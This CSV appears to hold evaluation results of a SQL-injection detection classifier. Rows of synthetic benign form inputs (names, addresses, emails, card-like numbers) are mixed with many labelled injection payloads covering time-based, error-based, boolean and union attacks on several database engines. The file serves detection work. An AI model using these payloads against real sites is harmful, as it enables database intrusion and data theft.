Query,Label,RawMargin,Prob_Raw,Pred_Default,Pred_BestThr,BestThr,BestThr_Margin
86613661p,0,-13.598825454711914,1.2419515087458421e-06,0,0,0.18,-1.5163474893680886
"avinguda guix borrull 170,",0,-10.972403526306152,1.716873339319136e-05,0,0,0.18,-1.5163474893680886
1' in boolean mode) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))#,1,10.057967185974121,0.9999572038650513,1,1,0.18,-1.5163474893680886
enid,0,-7.051848888397217,0.000865057751070708,0,0,0.18,-1.5163474893680886
"1%"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,9.736767768859863,0.9999408721923828,1,1,0.18,-1.5163474893680886
regir,0,-9.823988914489746,5.413427425082773e-05,0,0,0.18,-1.5163474893680886
73862262q,0,-13.598825454711914,1.2419515087458421e-06,0,0,0.18,-1.5163474893680886
"1 and 3824=benchmark(5000000,md5(0x76555642))-- kvkk",1,6.499146938323975,0.998497486114502,1,1,0.18,-1.5163474893680886
"1'+(select 'stdl' where 4581=4581;iif(7953=3021,1,1/0)",1,9.586738586425781,0.9999313354492188,1,1,0.18,-1.5163474893680886
15318,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
puebla de don fadrique,0,-11.162936210632324,1.4190321962814778e-05,0,0,0.18,-1.5163474893680886
"1%'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",1,10.639970779418945,0.9999760389328003,1,1,0.18,-1.5163474893680886
-1300) as rrsm where 1086=1086 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,1,9.303030014038086,0.9999088048934937,1,1,0.18,-1.5163474893680886
tolan.herlie@movil-google.mx,0,-8.909638404846191,0.00013506243703886867,0,0,0.18,-1.5163474893680886
5609281193930681,0,-8.457174301147461,0.00021232622384559363,0,0,0.18,-1.5163474893680886
"-1072%"")) or 3090=3539",1,9.844371795654297,0.9999469518661499,1,1,0.18,-1.5163474893680886
alfio,0,-9.823988914489746,5.413427425082773e-05,0,0,0.18,-1.5163474893680886
"1"")) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((""nzhj"" like ""nzhj",1,9.425145149230957,0.9999192953109741,1,1,0.18,-1.5163474893680886
51518827t,0,-13.598825454711914,1.2419515087458421e-06,0,0,0.18,-1.5163474893680886
wardle,0,-12.949872016906738,2.3765173864376266e-06,0,0,0.18,-1.5163474893680886
daroca,0,-12.949872016906738,2.3765173864376266e-06,0,0,0.18,-1.5163474893680886
delsa,0,-9.823988914489746,5.413427425082773e-05,0,0,0.18,-1.5163474893680886
mwa,0,-10.053400039672852,4.3037314753746614e-05,0,0,0.18,-1.5163474893680886
liester-okamoto@carloshoya.np,0,-10.802779197692871,2.0342473362688906e-05,0,0,0.18,-1.5163474893680886
morneau,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
contradicha,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
aprea@ingenelec.es,0,-10.601479530334473,2.487855454091914e-05,0,0,0.18,-1.5163474893680886
8490972534756597,0,-8.457174301147461,0.00021232622384559363,0,0,0.18,-1.5163474893680886
aquiles,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
vivie4,0,-12.949872016906738,2.3765173864376266e-06,0,0,0.18,-1.5163474893680886
0iri1a33,0,-8.755297660827637,0.00015759922098368406,0,0,0.18,-1.5163474893680886
enjergado,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
72500690k,0,-13.598825454711914,1.2419515087458421e-06,0,0,0.18,-1.5163474893680886
modelada,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
"1%"");select sleep(5)#",1,8.85102653503418,0.99985671043396,1,1,0.18,-1.5163474893680886
"1%"")) or 8466=benchmark(5000000,md5(0x694a4745)) and ((""%""=""",1,9.525766372680664,0.9999270439147949,1,1,0.18,-1.5163474893680886
10729,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
exigidad,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
"1%"") or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""%""=""",1,9.0065279006958,0.9998773336410522,1,1,0.18,-1.5163474893680886
"1"") where 6311=6311;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1,8.722162246704102,0.9998370409011841,1,1,0.18,-1.5163474893680886
no,0,-12.401707649230957,4.111544512852561e-06,0,0,0.18,-1.5163474893680886
petronil,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
perla,0,-9.823988914489746,5.413427425082773e-05,0,0,0.18,-1.5163474893680886
37718,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
"-6534%')) or make_set(4107=9457,9457) and (('%'='",1,11.494534492492676,0.9999898672103882,1,1,0.18,-1.5163474893680886
"-8651"") where 8391=8391 union all select 8391,8391#",1,8.889734268188477,0.9998621940612793,1,1,0.18,-1.5163474893680886
12480,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
"1%'))) union all select null,null,null,null,null,null,null,null,null#",1,10.203728675842285,0.9999629259109497,1,1,0.18,-1.5163474893680886
"1%"") or elt(5873=5873,sleep(5))#",1,9.527528762817383,0.9999271631240845,1,1,0.18,-1.5163474893680886
05480,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
co2posi9or,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
"-5313') union all select 7187,7187,7187#",1,10.944743156433105,0.9999823570251465,1,1,0.18,-1.5163474893680886
mocej*n,0,-12.04249382019043,5.888555733690737e-06,0,0,0.18,-1.5163474893680886
1')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('hcpo' like 'hcpo,1,9.625686645507812,0.9999339580535889,1,1,0.18,-1.5163474893680886
ludolfo,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
"1')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('jfwt' like 'jfwt",1,9.804056167602539,0.999944806098938,1,1,0.18,-1.5163474893680886
1'+(select xzse where 4530=4530;(select * from (select(sleep(5)))srmq))+',1,9.480327606201172,0.9999237060546875,1,1,0.18,-1.5163474893680886
"errekerte 113,",0,-10.476886749267578,2.8179521905258298e-05,0,0,0.18,-1.5163474893680886
nixon@chinavende.bw,0,-10.603124618530273,2.4837660021148622e-05,0,0,0.18,-1.5163474893680886
31392,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
hablistn,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
goyenaga,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
1')));select case when 2948=7279 then 1 else null end--,1,8.933798789978027,0.9998681545257568,1,1,0.18,-1.5163474893680886
a2o2e5,0,-11.473212242126465,1.040501501847757e-05,0,0,0.18,-1.5163474893680886
berber,0,-12.949872016906738,2.3765173864376266e-06,0,0,0.18,-1.5163474893680886
"1)) as eigk where 2557=2557;select count(*) from generate_series(1,5000000)--",1,9.39824390411377,0.9999171495437622,1,1,0.18,-1.5163474893680886
floreal,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
hac228ej7,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
"1%""));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1,9.736767768859863,0.9999408721923828,1,1,0.18,-1.5163474893680886
62162273n,0,-13.598825454711914,1.2419515087458421e-06,0,0,0.18,-1.5163474893680886
3835247742889703,0,-8.457174301147461,0.00021232622384559363,0,0,0.18,-1.5163474893680886
fincias alcoriza,0,-11.30394172668457,1.2324098861427046e-05,0,0,0.18,-1.5163474893680886
petree,0,-12.949872016906738,2.3765173864376266e-06,0,0,0.18,-1.5163474893680886
"calle cua, 34",0,-9.613713264465332,6.68018328724429e-05,0,0,0.18,-1.5163474893680886
bojanic-gidra-tolan@elcarritodelacompra.ma,0,-10.062654495239258,4.264088420313783e-05,0,0,0.18,-1.5163474893680886
"c/ blanquers 13, 9-b",0,-8.62428092956543,0.00017965708684641868,0,0,0.18,-1.5163474893680886
2160,0,-9.61086368560791,6.699244841001928e-05,0,0,0.18,-1.5163474893680886
65904927z,0,-13.598825454711914,1.2419515087458421e-06,0,0,0.18,-1.5163474893680886
"-4095') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1,10.729433059692383,0.9999780654907227,1,1,0.18,-1.5163474893680886
1') as xbsc where 6772=6772;waitfor delay '0:0:5'--,1,10.824646949768066,0.999980092048645,1,1,0.18,-1.5163474893680886
"1'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('sdnc'='sdnc",1,10.432930946350098,0.999970555305481,1,1,0.18,-1.5163474893680886
1) as qkkm where 8461=8461;select (case when (9030=9185) then 9030 else 9030*(select 9030 from information_schema.character_sets) end)#,1,8.722162246704102,0.9998370409011841,1,1,0.18,-1.5163474893680886
"-2276"")) as qwow where 2321=2321 or 3534=2971--",1,8.811254501342773,0.9998509883880615,1,1,0.18,-1.5163474893680886
06310,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
25270,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
"1"" where 2483=2483;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",1,8.722162246704102,0.9998370409011841,1,1,0.18,-1.5163474893680886
sant hilari sacalm,0,-10.358046531677246,3.1735387892695144e-05,0,0,0.18,-1.5163474893680886
"1 where 4787=4787;iif(1483=7301,1,1/0)",1,6.441295146942139,0.9984082579612732,1,1,0.18,-1.5163474893680886
v5964,0,-10.18832015991211,3.760559411603026e-05,0,0,0.18,-1.5163474893680886
"1))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,9.303030014038086,0.9999088048934937,1,1,0.18,-1.5163474893680886
bartol basco,0,-13.065027236938477,2.118018755936646e-06,0,0,0.18,-1.5163474893680886
azuara,0,-12.949872016906738,2.3765173864376266e-06,0,0,0.18,-1.5163474893680886
05123,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
arcediano,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
"1%' or elt(5873=5873,sleep(5))#",1,10.41926383972168,0.9999701976776123,1,1,0.18,-1.5163474893680886
"1) where 3740=3740 union all select null,null,null,null,null,null,null,null--",1,8.817376136779785,0.9998518228530884,1,1,0.18,-1.5163474893680886
"1""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((""vfvh""=""vfvh",1,9.425145149230957,0.9999192953109741,1,1,0.18,-1.5163474893680886
"1"" union all select null,null,null,null,null,null--",1,8.817376136779785,0.9998518228530884,1,1,0.18,-1.5163474893680886
d50allecido,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
whit,0,-7.051848888397217,0.000865057751070708,0,0,0.18,-1.5163474893680886
p81i4uer3o,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
1984,0,-9.59145736694336,6.830512575106695e-05,0,0,0.18,-1.5163474893680886
jana,0,-7.051848888397217,0.000865057751070708,0,0,0.18,-1.5163474893680886
"1';select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,10.250514030456543,0.999964714050293,1,1,0.18,-1.5163474893680886
cutler.hutton@the-white-pearl-resort.int,0,-8.073026657104492,0.00031174084870144725,0,0,0.18,-1.5163474893680886
lorraine,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
50228,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
howlett,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
"1') where 2120=2120;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",1,10.824646949768066,0.999980092048645,1,1,0.18,-1.5163474893680886
8264568534946529,0,-8.457174301147461,0.00021232622384559363,0,0,0.18,-1.5163474893680886
ab_ogadora,0,-12.61778736114502,3.312555236334447e-06,0,0,0.18,-1.5163474893680886
"1"") or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""zzkc""=""zzkc",1,9.0065279006958,0.9998773336410522,1,1,0.18,-1.5163474893680886
sit agulla,0,-13.065027236938477,2.118018755936646e-06,0,0,0.18,-1.5163474893680886
"calle transversal de poniente, 71,",0,-10.756542205810547,2.1305113477865234e-05,0,0,0.18,-1.5163474893680886
49449729m,0,-13.598825454711914,1.2419515087458421e-06,0,0,0.18,-1.5163474893680886
"1"")) as dcrk where 5164=5164 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,9.303030014038086,0.9999088048934937,1,1,0.18,-1.5163474893680886
pundyk,0,-12.949872016906738,2.3765173864376266e-06,0,0,0.18,-1.5163474893680886
olsen,0,-9.823988914489746,5.413427425082773e-05,0,0,0.18,-1.5163474893680886
aldunce garbino,0,-10.781715393066406,2.077550016110763e-05,0,0,0.18,-1.5163474893680886
masters-mcnear@costablancarental.ax,0,-10.537732124328613,2.6516094294493087e-05,0,0,0.18,-1.5163474893680886
nobuo,0,-9.823988914489746,5.413427425082773e-05,0,0,0.18,-1.5163474893680886
31243,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
8773448102181784,0,-8.457174301147461,0.00021232622384559363,0,0,0.18,-1.5163474893680886
"1%' union all select null,null,null,null,null,null,null,null,null#",1,10.203728675842285,0.9999629259109497,1,1,0.18,-1.5163474893680886
"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""ikaf"" like ""ikaf",1,9.692231178283691,0.9999382495880127,1,1,0.18,-1.5163474893680886
torterolo buix,0,-11.015188217163086,1.644967960601207e-05,0,0,0.18,-1.5163474893680886
"1' in boolean mode) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#",1,10.936471939086914,0.9999822378158569,1,1,0.18,-1.5163474893680886
2473968960827836,0,-8.457174301147461,0.00021232622384559363,0,0,0.18,-1.5163474893680886
"-6333""))) union all select 9851,9851,9851,9851,9851,9851--",1,9.701340675354004,0.9999388456344604,1,1,0.18,-1.5163474893680886
"-1162"")) as mhmh where 8710=8710 or make_set(4822=7598,7598)--",1,9.470602035522461,0.9999228715896606,1,1,0.18,-1.5163474893680886
14860,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
"1""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""wvyb""=""wvyb",1,10.528144836425781,0.9999731779098511,1,1,0.18,-1.5163474893680886
merl,0,-7.051848888397217,0.000865057751070708,0,0,0.18,-1.5163474893680886
labandn tuto,0,-13.065027236938477,2.118018755936646e-06,0,0,0.18,-1.5163474893680886
1 where 3357=3357 and (9492=4334)*4334--,1,9.763646125793457,0.9999425411224365,1,1,0.18,-1.5163474893680886
11901410z,0,-13.598825454711914,1.2419515087458421e-06,0,0,0.18,-1.5163474893680886
"1'||(select 'fjlg' from dual where 9517=9517;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1,10.729433059692383,0.9999780654907227,1,1,0.18,-1.5163474893680886
0406141531828732,0,-8.457174301147461,0.00021232622384559363,0,0,0.18,-1.5163474893680886
"1') or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,10.729433059692383,0.9999780654907227,1,1,0.18,-1.5163474893680886
"1%')) union all select null,null,null,null,null,null,null--",1,10.243779182434082,0.9999644756317139,1,1,0.18,-1.5163474893680886
64575959d,0,-13.598825454711914,1.2419515087458421e-06,0,0,0.18,-1.5163474893680886
"plza. alemania, 134, 12?f",0,-6.228804111480713,0.001967928372323513,0,0,0.18,-1.5163474893680886
6202740443449579,0,-8.457174301147461,0.00021232622384559363,0,0,0.18,-1.5163474893680886
hindman@primeracasa-ebs.il,0,-10.854620933532715,1.9314773453515954e-05,0,0,0.18,-1.5163474893680886
huaripuma guisasola,0,-10.671412467956543,2.319820487173274e-05,0,0,0.18,-1.5163474893680886
30827206f,0,-13.598825454711914,1.2419515087458421e-06,0,0,0.18,-1.5163474893680886
1%');begin user_lock.sleep(5); end--,1,10.801502227783203,0.9999796152114868,1,1,0.18,-1.5163474893680886
lippens27,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
cary-whitten@magritte.pe,0,-10.854620933532715,1.9314773453515954e-05,0,0,0.18,-1.5163474893680886
5mpe92onal,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
i39str845vo,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
borobia,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
padral gracida,0,-11.015188217163086,1.644967960601207e-05,0,0,0.18,-1.5163474893680886
pl9t1r4,0,-8.755297660827637,0.00015759922098368406,0,0,0.18,-1.5163474893680886
"1"")) as pqbs where 4409=4409;iif(1746=1730,1,1/0)",1,8.943675994873047,0.9998694658279419,1,1,0.18,-1.5163474893680886
"sequera de haza, la",0,-10.912979125976562,1.821987643779721e-05,0,0,0.18,-1.5163474893680886
(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7992=7992) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)),1,9.254415512084961,0.9999042749404907,1,1,0.18,-1.5163474893680886
"1""));select count(*) from generate_series(1,5000000) and ((""bhmu"" like ""bhmu",1,9.101741790771484,0.99988853931427,1,1,0.18,-1.5163474893680886
"1"") and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""pdsy"" like ""pdsy",1,9.425145149230957,0.9999192953109741,1,1,0.18,-1.5163474893680886
rakin,0,-9.823988914489746,5.413427425082773e-05,0,0,0.18,-1.5163474893680886
noel,0,-7.051848888397217,0.000865057751070708,0,0,0.18,-1.5163474893680886
"1%' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and '%'='",1,10.639970779418945,0.9999760389328003,1,1,0.18,-1.5163474893680886
"-6599%"")) or make_set(9354=9354,7185) and ((""%""=""",1,10.281546592712402,0.9999657869338989,1,1,0.18,-1.5163474893680886
04479,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
"1%""))) rlike sleep(5)#",1,8.05542278289795,0.9996827840805054,1,1,0.18,-1.5163474893680886
25410,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
9079098959660122,0,-8.457174301147461,0.00021232622384559363,0,0,0.18,-1.5163474893680886
"-3822"")) as dftp where 2817=2817 union all select 2817,2817,2817,2817,2817,2817#",1,8.722162246704102,0.9998370409011841,1,1,0.18,-1.5163474893680886
"-5513""))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""ovmk"" like ""ovmk",1,9.0065279006958,0.9998773336410522,1,1,0.18,-1.5163474893680886
1) waitfor delay '0:0:5'--,1,5.2247772216796875,0.994647204875946,1,1,0.18,-1.5163474893680886
"1) where 5550=5550 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",1,9.303030014038086,0.9999088048934937,1,1,0.18,-1.5163474893680886
"1,(select (case when (3888=3888) then (select count(*) from generate_series(1,5000000)) else 1/(select 0) end))",1,9.0065279006958,0.9998773336410522,1,1,0.18,-1.5163474893680886
quan@arroyo-molinos.ee,0,-10.782262802124023,2.0764131477335468e-05,0,0,0.18,-1.5163474893680886
"1' in boolean mode);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,10.824646949768066,0.999980092048645,1,1,0.18,-1.5163474893680886
"1"")) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((""vdyr""=""vdyr",1,9.0065279006958,0.9998773336410522,1,1,0.18,-1.5163474893680886
"-7676"")) as flov where 7967=7967 union all select 7967--",1,7.292273044586182,0.9993196725845337,1,1,0.18,-1.5163474893680886
ananas,0,-12.949872016906738,2.3765173864376266e-06,0,0,0.18,-1.5163474893680886
9998088000737716,0,-8.457174301147461,0.00021232622384559363,0,0,0.18,-1.5163474893680886
gorin.mccracken@evelin.am,0,-8.841766357421875,0.00014454626943916082,0,0,0.18,-1.5163474893680886
48102,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
9209,0,-9.59145736694336,6.830512575106695e-05,0,0,0.18,-1.5163474893680886
t0na5t44la,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
gutarra marimon,0,-10.781715393066406,2.077550016110763e-05,0,0,0.18,-1.5163474893680886
29350,0,-7.342324733734131,0.000647124310489744,0,0,0.18,-1.5163474893680886
mediavilla buera,0,-11.30394172668457,1.2324098861427046e-05,0,0,0.18,-1.5163474893680886
cantalejo,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
oseja,0,-9.823988914489746,5.413427425082773e-05,0,0,0.18,-1.5163474893680886
"1%"")) and make_set(9897=5557,5557) and ((""%""=""",1,10.570721626281738,0.9999743700027466,1,1,0.18,-1.5163474893680886
"1') as vmmk where 5757=5757 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,10.729433059692383,0.9999780654907227,1,1,0.18,-1.5163474893680886
-6433%')) or 9323=9323#,1,11.515746116638184,0.9999899864196777,1,1,0.18,-1.5163474893680886
"1') as pfwt where 8448=8448 union all select null,null,null,null,null,null,null,null,null#",1,10.203728675842285,0.9999629259109497,1,1,0.18,-1.5163474893680886
tanitans,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
levisky,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
51942267x,0,-13.598825454711914,1.2419515087458421e-06,0,0,0.18,-1.5163474893680886
"1"")) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((""oxvs"" like ""oxvs",1,9.425145149230957,0.9999192953109741,1,1,0.18,-1.5163474893680886
chuanhsi,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
"1',(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4250=4250) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",1,10.552974700927734,0.9999738931655884,1,1,0.18,-1.5163474893680886
12064316b,0,-13.598825454711914,1.2419515087458421e-06,0,0,0.18,-1.5163474893680886
fal429a,0,-8.755297660827637,0.00015759922098368406,0,0,0.18,-1.5163474893680886
"1"")) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""qyew""=""qyew",1,9.0065279006958,0.9998773336410522,1,1,0.18,-1.5163474893680886
inca,0,-7.051848888397217,0.000865057751070708,0,0,0.18,-1.5163474893680886
lazo,0,-7.051848888397217,0.000865057751070708,0,0,0.18,-1.5163474893680886
"1"" and elt(4249=4249,7259) and ""kgtz"" like ""kgtz",1,8.345440864562988,0.9997625946998596,1,1,0.18,-1.5163474893680886
"-1573"") union all select 3928,3928,3928,3928--",1,9.701340675354004,0.9999388456344604,1,1,0.18,-1.5163474893680886
jener monaj,0,-13.065027236938477,2.118018755936646e-06,0,0,0.18,-1.5163474893680886
jongwoei,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
lautaro,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
"-8844""))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1,9.303030014038086,0.9999088048934937,1,1,0.18,-1.5163474893680886
"1 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))-- wynp",1,9.303030014038086,0.9999088048934937,1,1,0.18,-1.5163474893680886
escudern,0,-13.012738227844238,2.2317144612316042e-06,0,0,0.18,-1.5163474893680886
"1%')) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,10.729433059692383,0.9999780654907227,1,1,0.18,-1.5163474893680886
"1')) as nxhp where 2649=2649 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,10.729433059692383,0.9999780654907227,1,1,0.18,-1.5163474893680886
"zoma, la",0,-12.553790092468262,3.531479933371884e-06,0,0,0.18,-1.5163474893680886
4908217523018940,0,-8.457174301147461,0.00021232622384559363,0,0,0.18,-1.5163474893680886
prdica,0,-12.949872016906738,2.3765173864376266e-06,0,0,0.18,-1.5163474893680886
"1"") as rovd where 3764=3764 and elt(4249=4249,7259)--",1,9.551947593688965,0.9999289512634277,1,1,0.18,-1.5163474893680886
"1') union all select null,null,null,null,null,null,null,null,null,null--",1,10.243779182434082,0.9999644756317139,1,1,0.18,-1.5163474893680886
"1 where 9072=9072 and elt(4249=4249,7259)--",1,10.578048706054688,0.9999744892120361,1,1,0.18,-1.5163474893680886
1'||(select 'jslz' where 8405=8405 rlike (select * from (select(sleep(5)))sgvo))||',1,10.432930946350098,0.999970555305481,1,1,0.18,-1.5163474893680886
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'ixzr'='ixzr,1,10.639970779418945,0.9999760389328003,1,1,0.18,-1.5163474893680886
wager.vigo@madrid2012.wf,0,-8.68806266784668,0.00016855790454428643,0,0,0.18,-1.5163474893680886
"de can clos, 162",0,-10.03105640411377,4.4009702833136544e-05,0,0,0.18,-1.5163474893680886
